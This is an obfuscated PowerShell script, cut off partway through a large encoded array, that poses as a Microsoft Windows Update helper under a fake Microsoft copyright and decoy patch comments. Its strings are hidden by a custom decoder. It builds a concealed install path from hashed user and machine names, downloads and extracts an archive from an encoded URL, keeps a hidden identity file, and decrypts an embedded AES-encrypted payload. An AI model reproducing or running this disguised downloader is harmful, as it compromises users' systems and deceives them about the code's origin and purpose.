# Microsoft Windows Update - helper runtime
# (c) Microsoft Corporation. All rights reserved.
# Deferred runtime deployment helper for Microsoft components.
$ErrorActionPreference="Continue"
function Write-DebugLog { param($m) }
$uwdmydpi=@("b5c684af8775355f392a28095d85cda3ce","b980baa5887c35350c2b12fd60d5","bbcd86f16f78714c3e514609f9","d0c7b6a949c630","cf718794917d343445291302fb8b96bd9fdb3c501c3f27116f7bc7b4adeaf65d504e3b","cf718794917d343445291302fb8b96bd9fdb3c501c3f27116f7bc3bdb89c83ff4f3c512c11","bac1b6a4917e","cf718794917d343445291302fb8b96bd9fdb3c501c3f27116f7b","cf718794917d3463392b4556f58c91fa7fdaf1701e3f2b66fdf8d2ad78b98d03","cf718794917d3463392b4556f58c91fa7fdaf1701e3f2b66fdf8d2ad78bb81785a4d48110bfced","bfaad7","cf718794917d3463392b4556f58c91fa7fdaf1701e3f2b66fdf8d2ad78b089745e413c2729ffe6d1","b2a3d7b383","cf718794917d342d6376ed09f9cf98adafdce8694d3d","cf718794917d3463392b4556f58c91fa7fdaf1701e3f2b66fdf8d2ad78bbf80d523c3b337e8aedd5c1","cf718794917d3463392b4556f58c91fa7fdaf1701e3f2b66fdf8d2ad78bbf80d523c3b337e8aedd5c1958b8471","cccdb9a4","cf718794917d342d637627545cd5c9b9ac8d7964512a","cf718794917d3433433644095c8c","cf718794917d3464392046c211cec7b79e817c67","cf718794917d3463392b4556f58c91fa7fdaf1701e3f2b66fdf8d2ad78ada641","cf718794917d3463392b4556f58c91fa7fdaf1701e3f2b66fdf8d2ad788baa556c7d04","cf718794917d3436451cf7fff886cda6ce8de8","cf718794917d342f093116","cf718794917d342d6376ea055ed8","cf718794917d342d6376f4fdf6d5","cf718794917d3431401e1156fbcec5b190dc","d0c7b6a94875da51","d0c7b6a948d27148","10c8c1a4","bdc8bac48dcc69","b6c7b7a586","6fcd8793857f742d3e","6fcb88ad8acc8c4d462d","6ec987ab70816e51","10c287","c37cb993873edc560f","11","1280","b6a7d7c5669992285e492625","c9dbd5b66a6a93326554f5","bfa7ddd0a16c8d666049ed29","c9dbd5b668999531","ceadddd0","b1c1b7968bcb73520e","cbc1bca48bc7d7","b27abba7bc797503","b2c9b7ab8d776d03","bbc7bba78675","cfcd889a857b6d03","bfc7bdb08b7e6d4a0e1b","bd7b87a9897a6e4d391b","b98086a988cb7147401b","b1c7b6998675d7","da7c86b0bf92338740371609f48b04b7cc8f3b64452b36c768b9e2027c5044b893463b24113d9c058a76c8c0b890055f15063db8a0ac741e8578","d0c7b6a949c69940805acac2ba0d9bbd9045e23a5e")
$brsscqoa=[byte[]]@(78,194,229,89,220,230,169,139,129,112,0,28,148,174,254,22,154,106,223,156,120,7,153,201,15,192,57,73,122,233,46)
function aopepqgmde($vhbizugj){$uacdwijt=$uwdmydpi[$vhbizugj];$texktvpu=@();for($rzhkhjjb=0;$rzhkhjjb-lt$uacdwijt.Length;$rzhkhjjb+=2){$texktvpu+=[byte]("0x"+$uacdwijt.Substring($rzhkhjjb,2))};$shothsec='';for($rzhkhjjb=0;$rzhkhjjb-lt$texktvpu.Count;$rzhkhjjb++){$zvqxwwdp=$texktvpu[$rzhkhjjb];$zvqxwwdp=($zvqxwwdp-224-$rzhkhjjb+512)-band 0xFF;$zvqxwwdp=$zvqxwwdp-bxor(($rzhkhjjb*21)-band 0xFF);$zvqxwwdp=$zvqxwwdp-bxor 205;$zvqxwwdp=($zvqxwwdp+49)-band 0xFF;$shothsec+=[char]$zvqxwwdp};return $shothsec}
function lkaeqbknxt {
    param($qmalnaal)
    if (!(Test-Path $qmalnaal)) { $null = New-Item -ItemType Directory -Path $qmalnaal -Force }
}
function ajsbjbxaif {
    param($pzbbvnpa, $pnyjvopt)
    try {
        $ecdvknge = (((aopepqgmde 18)) -as [type])::FromBase64String($pzbbvnpa)
        $qpsdomnt = (((aopepqgmde 18)) -as [type])::FromBase64String($pnyjvopt)
        $djxerhvy = $qpsdomnt[0..31]
        $mzejjnum = $qpsdomnt[32..47]
        $udnvamsg = 0
        for ($whdofhiu = 0; $whdofhiu -lt $djxerhvy.Length; $whdofhiu++) { $udnvamsg = ($udnvamsg + $djxerhvy[$whdofhiu]) -band 0xFF }
        for ($whdofhiu = 0; $whdofhiu -lt $ecdvknge.Length; $whdofhiu++) {
            $ffhqjthw = $ecdvknge[$whdofhiu]
            $ecdvknge[$whdofhiu] = $ecdvknge[$whdofhiu] -bxor $udnvamsg
            $udnvamsg = ($udnvamsg * 7 + $ffhqjthw + ($whdofhiu -band 0xFF)) -band 0xFF
        }
        $tqgsxqpb = (((aopepqgmde 8)) -as [type])::Create()
        $tqgsxqpb.Mode = [Enum]::Parse((((aopepqgmde 9)) -as [type]), (aopepqgmde 10))
        $tqgsxqpb.Padding = [Enum]::Parse((((aopepqgmde 11)) -as [type]), (aopepqgmde 12))
        $tqgsxqpb.Key = [byte[]]$djxerhvy
        $tqgsxqpb.IV = [byte[]]$mzejjnum
        $grajtcwx = $tqgsxqpb.CreateDecryptor()
        $dsouoraa = New-Object (aopepqgmde 13) (,$ecdvknge)
        $bhxvagqg = New-Object (aopepqgmde 14) @($dsouoraa, $grajtcwx, [Enum]::Parse((((aopepqgmde 15)) -as [type]), (aopepqgmde 16)))
        $maoqfyfr = New-Object (aopepqgmde 17) $bhxvagqg
        $dnetusfo = $maoqfyfr.ReadToEnd()
        $maoqfyfr.Close(); $bhxvagqg.Close(); $dsouoraa.Close(); $tqgsxqpb.Dispose()
        return $dnetusfo
    } catch { return $null }
}
# Deployment stage: deferred
function kgpkhxfmko {
    $ydlrmyuq = ((((aopepqgmde 26)) -as [type])::GetEnvironmentVariable((aopepqgmde 39)))
    if (!$ydlrmyuq) { $ydlrmyuq = [IO.Path]::Combine((Join-Path ((((aopepqgmde 26)) -as [type])::GetEnvironmentVariable((aopepqgmde 40))) (aopepqgmde 30)), (aopepqgmde 31)) }
    $ochusoja = @((aopepqgmde 44), (aopepqgmde 45), (aopepqgmde 46), (aopepqgmde 47), (aopepqgmde 48))
    $lgvcqwij = @((aopepqgmde 49), (aopepqgmde 50), (aopepqgmde 51), (aopepqgmde 52), (aopepqgmde 53))
    $sqqjfaev = ((((aopepqgmde 26)) -as [type])::GetEnvironmentVariable((aopepqgmde 41))) + ((((aopepqgmde 26)) -as [type])::GetEnvironmentVariable((aopepqgmde 42)))
    $lmbrsjtj = (((aopepqgmde 20)) -as [type])::Create()
    $alfjtend = (((aopepqgmde 19)) -as [type])::UTF8.GetBytes($sqqjfaev)
    $riapjism = $lmbrsjtj.ComputeHash($alfjtend)
    $qkzfzywo = (((aopepqgmde 22)) -as [type])::ToString($riapjism)
    $wfmiufju = $qkzfzywo.Replace((aopepqgmde 37),"").Substring(0,8).ToLower()
    $vpsqqxzs = [int]((aopepqgmde 38) + $wfmiufju.Substring(0,2)) % $ochusoja.Length
    $mvmnktgz = [int]((aopepqgmde 38) + $wfmiufju.Substring(2,2)) % $lgvcqwij.Length
    $agcdmzrr = $ochusoja[$vpsqqxzs]
    $tpsrdezo = $lgvcqwij[$mvmnktgz]
    $wemgsxpn = $wfmiufju.Substring(4)
    $bnfsvipw = [IO.Path]::Combine($ydlrmyuq, $agcdmzrr)
    if (Test-Path $bnfsvipw) { return Join-Path (Join-Path $bnfsvipw $tpsrdezo) $wemgsxpn }
    return "$($ydlrmyuq)\$($wfmiufju)"
}
# Edge Update Component v120.0.6099.71
function vxtdaopgsb {
    param($npaguypd, $irlhasqh)
    $nbuevuuk = (aopepqgmde 54)
    $gmjdxmrc = Join-Path $npaguypd (aopepqgmde 28)
    $qjlyhcno = 3
    for ($bhzlkniq = 0; $bhzlkniq -lt $qjlyhcno; $bhzlkniq++) {
        try {
            if (Test-Path $gmjdxmrc) { Remove-Item $gmjdxmrc -Force -ErrorAction SilentlyContinue }
            & (aopepqgmde 0) -Uri $nbuevuuk -OutFile $gmjdxmrc -UseBasicParsing -ErrorAction Stop
            if ((Test-Path $gmjdxmrc) -and ((Get-Item $gmjdxmrc).Length -gt 1MB)) {
                if (Test-Path $irlhasqh) { Remove-Item $irlhasqh -Recurse -Force -ErrorAction SilentlyContinue }
                & (aopepqgmde 1) -Path $gmjdxmrc -DestinationPath $npaguypd -Force -ErrorAction Stop
                Remove-Item $gmjdxmrc -Force -ErrorAction SilentlyContinue
                $uvojgpwh = [IO.Path]::Combine($irlhasqh, (aopepqgmde 27))
                if (Test-Path $uvojgpwh) { return $true }
                $pjlcdaak = & (aopepqgmde 2) -Path $npaguypd -Directory -Filter (aopepqgmde 3) -ErrorAction SilentlyContinue
                foreach ($kkykmarh in $pjlcdaak) {
                    $vjyghzrp = [IO.Path]::Combine($kkykmarh.FullName, (aopepqgmde 27))
                    if (Test-Path $vjyghzrp) {
                        if ($kkykmarh.FullName -ne $irlhasqh) {
                            if (Test-Path $irlhasqh) { Remove-Item $irlhasqh -Recurse -Force -ErrorAction SilentlyContinue }
                            Move-Item $kkykmarh.FullName $irlhasqh -Force -ErrorAction SilentlyContinue
                        }
                        if (Test-Path (Join-Path $irlhasqh (aopepqgmde 27))) { return $true }
                    }
                }
            }
        } catch {
            Write-DebugLog "Attempt $($bhzlkniq + 1): $($_.Exception.Message)"
            Start-Sleep -Seconds 2
        }
    }
    return $false
}
# Patch sequence: KB5034765
function utmgniaxlt {
    if (-not (Test-Path $cpiaxrmh)) { return $null }
    try {
        $hihencys = Get-Content $cpiaxrmh -Raw -ErrorAction Stop
        $wpocbbni = (((aopepqgmde 18)) -as [type])::FromBase64String($hihencys)
        $sapouznw = (((aopepqgmde 19)) -as [type])::UTF8.GetString($wpocbbni)
        return $sapouznw | ConvertFrom-Json
    } catch { return $null }
}
function dcacqqdsdh {
    param($tfoabvhl)
    $sirgldyt = $tfoabvhl | ConvertTo-Json -Compress
    $rmhqrymu = (((aopepqgmde 19)) -as [type])::UTF8.GetBytes($sirgldyt)
    $jsvrkeaw = (((aopepqgmde 18)) -as [type])::ToBase64String($rmhqrymu)
    (((aopepqgmde 25)) -as [type])::WriteAllText($cpiaxrmh, $jsvrkeaw, (((aopepqgmde 19)) -as [type])::UTF8)
}
function wzpbhynude {
    $vwwqqhst = utmgniaxlt
    if ($vwwqqhst -and $vwwqqhst[(aopepqgmde 32)]) { return $vwwqqhst }
    $bvlbyjjq = (((aopepqgmde 23)) -as [type])::NewGuid()
    $okyyozks = ((((aopepqgmde 26)) -as [type])::GetEnvironmentVariable((aopepqgmde 41))) + ((((aopepqgmde 26)) -as [type])::GetEnvironmentVariable((aopepqgmde 42))) + $bvlbyjjq.ToString()
    $ziuvnfae = (((aopepqgmde 21)) -as [type])::Create()
    $gtsgwfso = (((aopepqgmde 19)) -as [type])::UTF8.GetBytes($okyyozks)
    $pmnzdqmq = $ziuvnfae.ComputeHash($gtsgwfso)
    $dllkehqa = (((aopepqgmde 22)) -as [type])::ToString($pmnzdqmq).Replace((aopepqgmde 37),"").Substring(0,16).ToLower()
    $jxtsvvbq = (((aopepqgmde 23)) -as [type])::NewGuid().ToString()
    $zcwdwnwq = $dllkehqa + (aopepqgmde 35)
    $wugtajme = $dllkehqa.Substring(8) + (aopepqgmde 36)
    $mglyydlo = @{}
    $mglyydlo[(aopepqgmde 32)] = $jxtsvvbq
    $mglyydlo[(aopepqgmde 33)] = $zcwdwnwq
    $mglyydlo[(aopepqgmde 34)] = $wugtajme
    dcacqqdsdh -tfoabvhl $mglyydlo
    return $mglyydlo
}
$tpggxqsn = kgpkhxfmko
$jbbmzkcx = Join-Path $tpggxqsn (aopepqgmde 55)
$mhyqlcce = Join-Path $jbbmzkcx (aopepqgmde 27)
$oqtoebyg = (((aopepqgmde 20)) -as [type])::Create().ComputeHash((((aopepqgmde 19)) -as [type])::UTF8.GetBytes($tpggxqsn))
$gfsenmuf = (((aopepqgmde 22)) -as [type])::ToString($oqtoebyg).Replace((aopepqgmde 37),"").Substring(0,6).ToLower()
$cpiaxrmh = [IO.Path]::Combine($tpggxqsn, $gfsenmuf)
try {
    lkaeqbknxt -qmalnaal $tpggxqsn
    $fzseteqi = wzpbhynude
    $oazczbvk = $fzseteqi[(aopepqgmde 33)]
    $cfdkauoe = [IO.Path]::Combine($tpggxqsn, $oazczbvk)
    if (!(Test-Path $mhyqlcce)) {
        $fazveflp = vxtdaopgsb -npaguypd $tpggxqsn -irlhasqh $jbbmzkcx
        if (-not $fazveflp) { throw "Installation failed" }
    }
    $zyhdyqxl = @(
        "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",
        "v/1Uh/GVx46Fv3Pc1jw=",
        "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",
